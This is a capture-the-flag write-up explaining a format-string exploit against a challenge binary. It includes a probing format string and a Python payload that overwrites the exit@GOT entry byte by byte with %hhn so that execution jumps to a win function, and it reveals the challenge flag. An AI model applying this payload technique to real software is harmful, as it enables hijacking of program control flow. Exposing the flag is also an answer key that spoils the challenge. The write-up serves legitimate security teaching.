# Challenge `Calling Functions Again` Writeup

- Vulnerability: 
  - Format strings
- Where:
  - printf function
- Impact:
  - allows to call functions

## Analyzing the server

The main function call a function which reads the user input to a buffer then exits the program.

## Exploit

By running `gdb` its possible to find the address of the `win` function. 
Using `objdump -R bin` will tells us the address of `exit@GOT`.
Sending the following format string
```
"AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x"
```
and verifying that the 7th register is filled with `41` (the value of `A`) tell us that we control the 7th register.
To call the `win` function we need to overwrite the `exit@GOT` address with the address of the `win` function.
Like in previous challenges, we can write the address byte by byte using the `%hhn` specifier.
```python
payload =  p32(exit_gop+2) + b'%007$hhn'                       
payload += p32(exit_gop+3) + b'%010$hhn'                  
payload += p32(exit_gop+1) + b'%000120c' + b'%013$hhn'     
payload += p32(exit_gop+0) + b'%000019c' + b'%018$hhn'   
```
Revealing the flag `SSof{You_G_O_T_me}`.

## Implementation

Full implementation can be found [here](calling-functions-again.py).
